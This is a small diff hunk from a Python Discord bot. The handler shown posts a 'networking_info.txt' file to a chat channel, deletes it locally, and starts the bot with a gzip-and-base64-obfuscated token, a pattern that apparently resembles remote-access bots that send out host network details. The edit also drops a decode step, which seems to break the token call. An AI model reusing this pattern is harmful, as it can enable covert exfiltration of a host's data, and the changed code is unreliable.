@@ -423,5 +423,6 @@ async def on_message(message):
         await message.channel.send(embed=embed)
         await message.channel.send(file=discord.File("networking_info.txt"))
         os.remove("networking_info.txt")
-client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode('utf-8'))
+
+client.run(gzip.decompress(base64.b64decode(reg_h.get_token())))
 #use py main.py <token> to run
